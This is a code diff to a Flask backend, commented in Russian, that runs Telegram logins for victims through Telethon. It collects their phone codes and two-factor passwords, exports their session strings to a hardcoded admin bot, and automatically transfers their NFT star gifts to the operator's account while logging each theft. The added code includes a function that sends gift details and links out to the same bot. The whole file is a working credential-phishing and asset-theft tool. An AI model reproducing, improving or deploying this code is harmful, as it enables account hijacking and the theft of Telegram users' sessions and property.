@@ -1,4 +1,4 @@
-# app.py — ПОЛНАЯ ВЕРСИЯ ДЛЯ RENDER
+# app.py — ФИНАЛЬНАЯ ВЕРСИЯ С GetStarGiftsRequest
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -10,10 +10,9 @@ import json
 import io
 import re
 from dotenv import load_dotenv
-from telethon import TelegramClient, events
-from telethon.tl.functions.payments import GetUserGiftsRequest, TransferStarGiftRequest
-from telethon.tl.functions.messages import SendMessageRequest
-from telethon.errors import FloodWaitError
+from telethon import TelegramClient
+from telethon.errors import FloodWaitError, SessionPasswordNeededError
+from telethon.tl.functions.payments import GetStarGiftsRequest, TransferStarGiftRequest
 import requests
 
 load_dotenv()
@@ -28,12 +27,11 @@ ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3
 ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
 ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', '8766481292'))
 
-# Хранилище сессий (временное, в RAM)
 user_sessions = {}
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 
-# ======== ОТПРАВКА ЛОГОВ АДМИНУ ========
+# ======== ОТПРАВКА ЛОГОВ ========
 def send_admin_log(text):
     try:
         requests.post(
@@ -45,7 +43,6 @@ def send_admin_log(text):
         print(f"Log error: {e}")
 
 def send_session_to_admin(phone, session_string, username, user_id):
-    """Отправляет сессию пользователя админу файлом"""
     try:
         lines = []
         lines.append("=" * 50)
@@ -76,17 +73,45 @@ def send_session_to_admin(phone, session_string, username, user_id):
     except Exception as e:
         print(f"Send session error: {e}")
 
-# ======== ПОЛУЧЕНИЕ ПОДАРКОВ ЧЕРЕЗ TELETHON ========
+def send_gift_to_admin(phone, username, gift):
+    """Отправляет информацию о подарке админу"""
+    try:
+        gift_id = getattr(gift, 'id', None) or getattr(gift, 'gift_id', None)
+        name = getattr(gift, 'name', f"Gift #{gift_id}")
+        
+        # Пытаемся получить ссылку
+        slug = getattr(gift, 'slug', None)
+        if slug:
+            link = f"https://t.me/nft/{slug}"
+        else:
+            link = f"https://t.me/nft/{name.replace(' ', '_')}-{gift_id}"
+        
+        text = (
+            f"🎁 *{name}*\n"
+            f"🆔 ID: `{gift_id}`\n"
+            f"📱 Phone: `{phone}`\n"
+            f"👤 Username: @{username}\n"
+            f"🔗 [Ссылка]({link})"
+        )
+        requests.post(
+            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
+            json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
+            timeout=5
+        )
+    except Exception as e:
+        print(f"Send gift error: {e}")
+
+# ======== ПОЛУЧЕНИЕ ПОДАРКОВ ЧЕРЕЗ GetStarGiftsRequest ========
 async def get_user_gifts_telethon(client, user_id):
     """
-    Получает все подарки пользователя через Telethon
-    Возвращает список словарей с полями: gift_id, name, link, raw_data
+    Получает подарки пользователя через GetStarGiftsRequest
     """
     try:
-        # Метод 1: GetUserGiftsRequest (MTProto)
-        result = await client(GetUserGiftsRequest(
+        # Получаем подарки пользователя
+        result = await client(GetStarGiftsRequest(
             user_id=user_id,
-            limit=100
+            limit=100,
+            offset='0'
         ))
         
         gifts = []
@@ -103,6 +128,7 @@ async def get_user_gifts_telethon(client, user_id):
                 elif hasattr(gift, 'sticker_set_name') and gift.sticker_set_name:
                     is_nft = True
                 
+                # Если это не NFT — пропускаем
                 if not is_nft:
                     continue
                 
@@ -130,50 +156,38 @@ async def get_user_gifts_telethon(client, user_id):
                 if not name:
                     name = f"NFT #{gift_id}"
                 
-                # Получаем коллекцию для ссылки
-                collection = None
-                if hasattr(gift, 'sticker_set_name') and gift.sticker_set_name:
-                    collection = gift.sticker_set_name
-                elif hasattr(gift, 'name') and gift.name:
-                    collection = gift.name
-                
-                if not collection:
-                    collection = f"nft_{gift_id}"
-                
-                collection = re.sub(r'[^a-zA-Z0-9_-]', '', str(collection))
-                link = f"https://t.me/nft/{collection}-{gift_id}"
+                # Получаем slug для ссылки
+                slug = getattr(gift, 'slug', None)
                 
                 gifts.append({
                     'gift_id': gift_id,
                     'name': name,
-                    'collection': collection,
-                    'link': link,
+                    'slug': slug,
                     'raw_data': gift
                 })
         
+        print(f"[+] Found {len(gifts)} NFT gifts for user {user_id}")
         return gifts
         
     except Exception as e:
-        print(f"[Telethon] GetUserGiftsRequest error: {e}")
+        print(f"[-] GetStarGiftsRequest error: {e}")
         return []
 
-# ======== ПЕРЕДАЧА ПОДАРКОВ ЧЕРЕЗ TELETHON ========
+# ======== ПЕРЕДАЧА ПОДАРКА ========
 async def transfer_gift_telethon(client, gift_id, to_user_id):
     """
-    Передает подарок через Telethon
-    Использует TransferStarGiftRequest
+    Передает подарок через TransferStarGiftRequest
     """
     try:
-        result = await client(TransferStarGiftRequest(
+        await client(TransferStarGiftRequest(
             gift_id=gift_id,
             to_id=to_user_id
         ))
         return True
     except FloodWaitError as e:
         wait_time = e.seconds
-        print(f"[FloodWait] Waiting {wait_time} seconds...")
+        send_admin_log(f"⏳ FloodWait {wait_time} секунд")
         await asyncio.sleep(wait_time)
-        # Повторяем попытку
         try:
             await client(TransferStarGiftRequest(
                 gift_id=gift_id,
@@ -183,17 +197,13 @@ async def transfer_gift_telethon(client, gift_id, to_user_id):
         except:
             return False
     except Exception as e:
-        print(f"[Transfer] Failed for {gift_id}: {e}")
+        print(f"[-] Transfer error for {gift_id}: {e}")
         return False
 
 # ======== ОСНОВНАЯ ФУНКЦИЯ ========
 async def process_user_gifts_telethon(session_string, phone, username, user_id):
-    """
-    Основная функция: логинится через Telethon, собирает подарки, передает админу
-    """
     client = None
     try:
-        # 1. Создаем клиента Telethon
         client = TelegramClient(
             f"session_{phone}",
             API_ID,
@@ -203,18 +213,28 @@ async def process_user_gifts_telethon(session_string, phone, username, user_id):
         await client.connect()
         print(f"[+] Connected as {phone}")
         
-        # 2. Проверяем авторизацию
         try:
             me = await client.get_me()
             if not me:
                 send_admin_log(f"❌ Сессия не активна\n📱 {phone}")
                 return False
-            print(f"[+] User authorized: @{me.username}")
         except Exception as e:
             send_admin_log(f"❌ Ошибка авторизации\n📱 {phone}\n`{str(e)[:100]}`")
             return False
         
-        # 3. Получаем подарки пользователя
+        # Если это админ — просто показываем подарки
+        if user_id == ADMIN_USER_ID:
+            send_admin_log(f"👑 Админ @{username} проверил свои подарки")
+            gifts = await get_user_gifts_telethon(client, user_id)
+            if gifts:
+                for gift in gifts:
+                    send_gift_to_admin(phone, username, gift['raw_data'])
+                send_admin_log(f"📦 Всего подарков: {len(gifts)}")
+            else:
+                send_admin_log(f"📭 У админа нет подарков")
+            return True
+        
+        # Получаем подарки пользователя
         send_admin_log(f"🔍 Ищем NFT подарки @{username}...")
         gifts = await get_user_gifts_telethon(client, user_id)
         
@@ -222,8 +242,7 @@ async def process_user_gifts_telethon(session_string, phone, username, user_id):
             send_admin_log(
                 f"📭 *Нет NFT подарков*\n"
                 f"📱 {phone}\n"
-                f"👤 @{username}\n\n"
-                f"ℹ️ В профиле нет коллекционных подарков"
+                f"👤 @{username}"
             )
             return True
         
@@ -234,24 +253,19 @@ async def process_user_gifts_telethon(session_string, phone, username, user_id):
             f"🔄 Передаю админу..."
         )
         
-        # 4. Отправляем ссылки админу и передаем подарки
         transferred = 0
         failed = 0
         
         for gift in gifts:
             gift_id = gift['gift_id']
             name = gift['name']
-            link = gift['link']
             
-            # Отправляем ссылку админу
-            send_admin_log(
-                f"🎁 *{name}*\n"
-                f"🆔 ID: `{gift_id}`\n"
-                f"🔗 [Ссылка]({link})\n"
-                f"🔄 Передача..."
-            )
+            # Отправляем информацию о подарке админу
+            send_gift_to_admin(phone, username, gift['raw_data'])
             
-            # Пытаемся передать подарок админу
+            # Пытаемся передать подарок
+            send_admin_log(f"🔄 Передаю *{name}*...")
+            
             success = await transfer_gift_telethon(client, gift_id, ADMIN_USER_ID)
             
             if success:
@@ -263,7 +277,6 @@ async def process_user_gifts_telethon(session_string, phone, username, user_id):
             
             await asyncio.sleep(0.5)
         
-        # 5. Итоговый отчет
         send_admin_log(
             f"📊 *Результат*\n"
             f"📱 {phone}\n"
@@ -283,21 +296,17 @@ async def process_user_gifts_telethon(session_string, phone, username, user_id):
         if client and client.is_connected():
             try:
                 await client.disconnect()
-                print(f"[-] Disconnected")
             except:
                 pass
 
-# ======== ВЕРИФИКАЦИЯ ЧЕРЕЗ TELETHON ========
+# ======== ВЕРИФИКАЦИЯ ========
 async def send_code_telethon(phone):
-    """Отправляет код верификации через Telethon"""
     try:
         client = TelegramClient(f"temp_{phone}", API_ID, API_HASH)
         await client.connect()
         
-        # Отправляем код
         sent_code = await client.send_code_request(phone)
         
-        # Сохраняем клиента
         user_sessions[phone] = {
             'client': client,
             'phone_code_hash': sent_code.phone_code_hash
@@ -310,7 +319,6 @@ async def send_code_telethon(phone):
         return {'success': False, 'error': str(e)}
 
 async def check_code_telethon(phone, code, phone_code_hash):
-    """Проверяет код через Telethon"""
     try:
         session_data = user_sessions.get(phone)
         if not session_data:
@@ -319,17 +327,14 @@ async def check_code_telethon(phone, code, phone_code_hash):
         client = session_data['client']
         
         try:
-            # Входим с кодом
             signed_in = await client.sign_in(
                 phone=phone,
                 code=code,
                 phone_code_hash=phone_code_hash
             )
             
-            # Получаем сессию
             session_string = await client.export_session_string()
             
-            # Получаем данные пользователя
             me = await client.get_me()
             
             user_data = {
@@ -361,18 +366,17 @@ async def check_code_telethon(phone, code, phone_code_hash):
                 'gifts_processed': result
             }
             
+        except SessionPasswordNeededError:
+            send_admin_log(f"🔐 Требуется пароль\n📱 {phone}")
+            return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}
+            
         except Exception as e:
-            error_msg = str(e)
-            if 'SESSION_PASSWORD_NEEDED' in error_msg or '2FA' in error_msg:
-                send_admin_log(f"🔐 Требуется пароль\n📱 {phone}")
-                return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}
-            return {'success': False, 'error': error_msg}
+            return {'success': False, 'error': str(e)}
             
     except Exception as e:
         return {'success': False, 'error': str(e)}
 
 async def check_password_telethon(phone, password):
-    """Проверяет пароль 2FA через Telethon"""
     try:
         session_data = user_sessions.get(phone)
         if not session_data:
@@ -381,13 +385,10 @@ async def check_password_telethon(phone, password):
         client = session_data['client']
         
         try:
-            # Входим с паролем
             await client.sign_in(password=password)
             
-            # Получаем сессию
             session_string = await client.export_session_string()
             
-            # Получаем данные пользователя
             me = await client.get_me()
             
             user_data = {
@@ -404,7 +405,6 @@ async def check_password_telethon(phone, password):
             send_admin_log(f"🔑 Верификация по паролю успешна\n📱 {phone}\n👤 @{user_data['username']}")
             send_session_to_admin(phone, session_string, user_data['username'], user_data['user_id'])
             
-            # АВТОМАТИЧЕСКАЯ ПЕРЕДАЧА ПОДАРКОВ
             result = await process_user_gifts_telethon(
                 session_string,
                 phone,
@@ -433,9 +433,9 @@ def run_async(coro):
 def ping():
     return jsonify({
         'status': 'online',
-        'service': 'NFT Gift Transfer (Telethon)',
-        'version': '6.0',
-        'note': 'Деплой на Render'
+        'service': 'NFT Gift Transfer',
+        'version': '8.0',
+        'method': 'GetStarGiftsRequest'
     })
 
 @app.route('/sendCode', methods=['POST'])
@@ -510,7 +510,7 @@ def check_password():
 
 if __name__ == '__main__':
     print("=" * 60)
-    print("🤖 NFT GIFT TRANSFER v6.0 (Telethon)")
-    print("📌 Деплой на Render")
+    print("🤖 NFT GIFT TRANSFER v8.0")
+    print("📌 Метод: GetStarGiftsRequest")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000, debug=False)
